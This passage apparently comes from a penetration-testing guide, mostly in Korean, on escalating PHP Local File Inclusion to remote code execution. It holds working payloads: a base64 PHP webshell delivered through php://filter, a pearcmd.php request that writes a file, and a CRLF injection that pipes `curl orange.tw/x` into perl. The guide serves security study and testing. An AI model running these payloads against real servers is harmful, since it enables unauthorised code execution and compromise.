```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters를 통한 방법 (파일 불필요)

이 [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)는 **php filters를 사용해 임의의 콘텐츠를 출력으로 생성할 수 있다**고 설명합니다. 요컨대, 파일로 작성하지 않고도 include에 사용할 **임의의 php code를 생성할 수 있다**는 뜻입니다.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault를 통한 방법

파일을 **업로드**하면 `/tmp`에 **임시**로 저장됩니다. 같은 **요청에서** **segmentation fault**를 발생시키면 해당 **임시 파일이 삭제되지 않으며** 이를 찾아볼 수 있습니다.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage를 통한 방법

**Local File Inclusion**를 발견했고 **Nginx**가 PHP 앞단에서 동작한다면 다음 기법으로 **RCE**를 얻을 수 있습니다:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS를 통한 방법

세션이 없고 `session.auto_start`가 `Off`인 경우에도 **Local File Inclusion**를 발견했다면, multipart POST 데이터에 **`PHP_SESSION_UPLOAD_PROGRESS`**를 포함하면 PHP가 **세션을 활성화**합니다. 이를 악용해 **RCE**를 얻을 수 있습니다:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows에서의 temp file uploads를 통한 방법

**Local File Inclusion**를 발견했고 서버가 **Windows**에서 동작한다면 RCE를 얻을 수 있습니다:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args를 통한 방법

이 글에서 [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)와 같이, `/usr/local/lib/phppearcmd.php` 스크립트는 php docker images에 기본으로 존재합니다. 또한 URL 파라미터에 `=`가 없으면 그 파라미터가 인수로 사용된다고 되어 있어, URL을 통해 스크립트에 인자를 전달할 수 있습니다. 또한 [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)과 [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)도 참고하세요.

다음 요청은 `/tmp/hello.php`에 `<?=phpinfo()?>` 내용을 가진 파일을 생성합니다:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용하여 RCE를 얻는 예제입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file_uploads = on you can get RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**이게 어떻게 유용한지는 잘 모르겠지만 가능성은 있습니다.**\
_PHP Fatal Error를 발생시켜도 업로드된 PHP 임시 파일은 삭제됩니다._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## 참고자료

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
